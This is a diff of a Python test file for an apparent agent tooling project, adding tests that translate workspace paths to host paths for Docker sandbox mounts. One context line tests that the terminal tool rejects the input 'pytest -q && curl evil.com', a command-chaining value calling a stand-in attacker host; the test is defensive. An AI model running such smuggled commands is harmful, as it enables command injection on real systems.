@@ -136,3 +136,56 @@ async def test_terminal_rejects_a_shell_string_explicitly(tmp_path: Path, monkey
     )
     result = await TerminalExecTool().execute(ctx, {"args": "pytest -q && curl evil.com"})
     assert "not a shell string" in result["error"]
+
+
+def test_host_path_translation_when_this_process_is_containerised(tmp_path: Path):
+    """The daemon runs on the host, so a bind mount must name the host's path. Passing the
+    path this process sees made every sandbox mount fail with "error while creating mount
+    source path" - the container's /app/workspaces does not exist on the host."""
+    from app.tools.sandbox_factory import to_host_path
+
+    local_root = tmp_path / "app" / "workspaces"
+    project = local_root / "proj123"
+    project.mkdir(parents=True)
+
+    settings = Settings(
+        workspaces_dir=str(local_root),
+        workspaces_host_dir="/opt/phoenix-forge/workspaces",
+    )
+
+    assert str(to_host_path(project, settings)) == "/opt/phoenix-forge/workspaces/proj123"
+
+
+def test_host_path_is_identity_when_not_containerised(tmp_path: Path):
+    from app.tools.sandbox_factory import to_host_path
+
+    project = tmp_path / "proj"
+    project.mkdir()
+    settings = Settings(workspaces_dir=str(tmp_path), workspaces_host_dir="")
+
+    assert str(to_host_path(project, settings)) == str(project.resolve())
+
+
+async def test_the_mount_uses_the_host_path(tmp_path: Path, monkeypatch):
+    captured: dict = {}
+
+    async def fake_exec(*args, **kwargs):
+        captured["args"] = args
+
+        class Proc:
+            returncode = 0
+
+            async def communicate(self):
+                return b"", b""
+
+        return Proc()
+
+    monkeypatch.setattr(DockerSandboxExecutor, "available", staticmethod(lambda: True))
+    monkeypatch.setattr("asyncio.create_subprocess_exec", fake_exec)
+
+    from pathlib import PurePosixPath
+
+    sandbox = DockerSandboxExecutor(tmp_path, host_workspace_root=PurePosixPath("/opt/forge/ws/p1"))
+    await sandbox.run_command(["true"])
+
+    assert "/opt/forge/ws/p1:/workspace:rw" in " ".join(captured["args"])
